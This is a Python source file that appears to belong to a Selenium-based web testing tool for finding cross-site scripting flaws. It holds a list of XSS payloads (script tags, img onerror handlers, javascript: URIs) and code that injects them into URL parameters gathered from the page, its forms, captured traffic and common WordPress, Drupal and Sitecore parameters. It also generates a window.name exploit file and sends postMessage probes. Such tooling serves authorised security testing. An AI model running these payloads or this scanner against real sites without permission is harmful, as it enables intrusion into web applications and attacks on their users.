from selenium.common.exceptions import UnexpectedAlertPresentException, WebDriverException
from selenium.webdriver.common.by import By
import time
from libs.utils.logger import FileLogger
from libs.utils import wait_for_enter

class XSSCommands:
    def __init__(self, webdriver, logger=None, network_logger=None):
        self.version = 2.0
        self.driver = webdriver
        self.logger = logger or FileLogger()
        self.network_logger = network_logger

    def _get_network_har(self):
        """Return HAR data from the attached network logger if available."""
        if not self.network_logger:
            return []
        try:
            return self.network_logger.get_har()
        except Exception as exc:
            self.logger.error(f"Error retrieving network HAR: {exc}")
            return []

    def _load_url_with_retry(self, url, delay: int = 2) -> None:
        """Load a URL retrying on network related errors."""
        network_errors = [
            'ERR_INTERNET_DISCONNECTED',
            'ERR_NAME_NOT_RESOLVED',
        ]
        while True:
            try:
                self.driver.get(url)
                break
            except WebDriverException as exc:
                message = str(exc)
                if any(err in message for err in network_errors):
                    self.logger.error(f'Internet error while loading {url}. Retrying...')
                    time.sleep(delay)
                    continue
                raise
        
        
    def find_xss(self):
        self.logger.log("finding xss...")
        current_url = self.driver.current_url
        suggestor = XSS_Url_Suggestor(
            current_url, self.driver, network_har=self._get_network_har()
        )
        urls_to_try = suggestor.get_xss_urls()
        self.logger.log("url is %s"%current_url)
        self.logger.log('')
        for x in urls_to_try:
            try:
                self._load_url_with_retry(x)
                time.sleep(2)
                self._load_url_with_retry(current_url)
            except UnexpectedAlertPresentException:
                self.logger.log("XSS - " + x)
            except Exception as e:
                self.logger.error(f'Error during XSS check: {e}')
        self.logger.log('')
        self.logger.log('')
        wait_for_enter()

    def create_window_name_exploit(self, payload=None, filename="windowname.html"):
        if payload is None:
            payload = "<script>alert('XSS')</script>"
        target_url = self.driver.current_url
        html = f"<script>window.name='{payload}';location='{target_url}';</script>"
        try:
            with open(filename, "w") as f:
                f.write(html)
            self.logger.log(f"Exploit file written to {filename}")
        except Exception as exc:
            self.logger.error(f"Failed to write exploit file: {exc}")
        wait_for_enter()

    def test_post_message(self, message=None):
        if message is None:
            message = "test"
        script = f"window.postMessage('{message}', '*');"
        try:
            self.driver.execute_script(script)
            self.logger.log("postMessage sent")
        except Exception as exc:
            self.logger.error(f"Failed to send postMessage: {exc}")
        wait_for_enter()

    def find_reflected_params(self, test_value: str = "heybertheyernie") -> None:
        """Look for parameters that reflect values without using HTML payloads."""
        self.logger.log("checking for reflected parameters...")
        current_url = self.driver.current_url
        suggestor = XSS_Url_Suggestor(
            current_url, self.driver, network_har=self._get_network_har()
        )
        existing = suggestor._existing_params()
        param_names = set(existing.keys())
        param_names.update(suggestor._form_field_names())
        param_names.update(suggestor._har_param_names())
        param_names.update(suggestor.common_param_names)
        base_url = current_url.split("?")[0]
        base_query = "&".join(f"{k}={v}" for k, v in existing.items())

        found_params = []

        for name in param_names:
            if name in existing:
                replaced = existing.copy()
                replaced[name] = test_value
                query = "&".join(f"{k}={v}" for k, v in replaced.items())
            else:
                query = base_query + ("&" if base_query else "") + f"{name}={test_value}"
            test_url = base_url + "?" + query if query else base_url
            try:
                self._load_url_with_retry(test_url)
                if test_value in self.driver.page_source:
                    self.logger.log(f"Reflected parameter found: {name}")
                    found_params.append((name, test_url))
            except Exception as exc:
                self.logger.error(f"Error testing {name}: {exc}")

        self._load_url_with_retry(current_url)

        if found_params:
            self.logger.log("Reflected parameters summary:")
            for pname, url in found_params:
                self.logger.log(f"  {pname}: {url}")
        else:
            self.logger.log("No reflected parameters detected.")

        wait_for_enter()
        


class XSS_Url_Suggestor:
    xss_attacks = ['<script>alert(1)</script>',
                   '</script><script>alert(1)</script>',
                   '<img src=x onerror="alert(1)" />',
                   "'/><img src=x onerror='alert(1)' />",
                   '"/><img src=x onerror="alert(1)" />',
                   ';alert(1);',
                   '";alert(1);',
                   "';alert(1);",
                   '--><script>alert(1)</script>',
                   '</title><script>alert(1)</script>',
                   '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
                   '<TD BACKGROUND="javascript:alert(\'XSS\')">',
                   '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
                   '<BGSOUND SRC="javascript:alert(\'XSS\');">']

    # Common parameter names found across many web applications.  The list has
    # been extended with parameters typically used by popular CMS platforms
    # such as WordPress, Drupal and Sitecore to improve XSS payload coverage.
    common_param_names = [
        # Generic parameters
        'search', 'query', 'id', 'page', 'q',
        # WordPress specific
        's', 'cat', 'tag', 'author', 'p', 'page_id', 'name',
        # Drupal specific
        'nid', 'node', 'type', 'search_api_fulltext',
        # Sitecore specific
        'sc_mode', 'sc_lang', 'sc_itemid', 'sc_site', 'sc_template',
        'sc_version'
    ]

    def __init__(self, url, driver=None, network_har=None):
        self.version = 2.0
        self.url = url
        self.driver = driver
        self.network_har = network_har or []

    def _existing_params(self):
        params = {}
        urlsplitloc = self.url.find("?")
        if urlsplitloc >= 0:
            paramstring = self.url[urlsplitloc+1:]
            if paramstring:
                pairs = paramstring.split('&')
                for single in pairs:
                    if '=' in single:
                        key, value = single.split('=', 1)
                    else:
                        key, value = single, ''
                    params[key] = value
        return params

    def _form_field_names(self):
        names = set()
        if not self.driver:
            return names
        try:
            elements = self.driver.find_elements(By.XPATH, "//form//input[@name] | //form//textarea[@name] | //form//select[@name]")
            for element in elements:
                name = element.get_attribute("name")
                if name:
                    names.add(name)
        except Exception:
            pass
        return names

    def _har_param_names(self):
        names = set()
        for entry in self.network_har:
            url = entry.get("url", "")
            if "?" in url:
                query = url.split("?", 1)[1]
                for pair in query.split("&"):
                    if not pair:
                        continue
                    if "=" in pair:
                        key, _ = pair.split("=", 1)
                    else:
                        key = pair
                    names.add(key)
        return names

    def get_xss_urls(self):
        rtnData = []

        existing_params = self._existing_params()
        param_names = set(existing_params.keys())
        param_names.update(self._form_field_names())
        param_names.update(self._har_param_names())
        param_names.update(self.common_param_names)

        base_url = self.url.split("?")[0]
        base_query = "&".join(f"{k}={v}" for k, v in existing_params.items())

        for name in param_names:
            for payload in self.xss_attacks:
                if name in existing_params:
                    replaced = existing_params.copy()
                    replaced[name] = payload
                    query = "&".join(f"{k}={v}" for k, v in replaced.items())
                else:
                    if base_query:
                        query = base_query + f"&{name}={payload}"
                    else:
                        query = f"{name}={payload}"
                rtnData.append(base_url + "?" + query)

        return rtnData
        
        
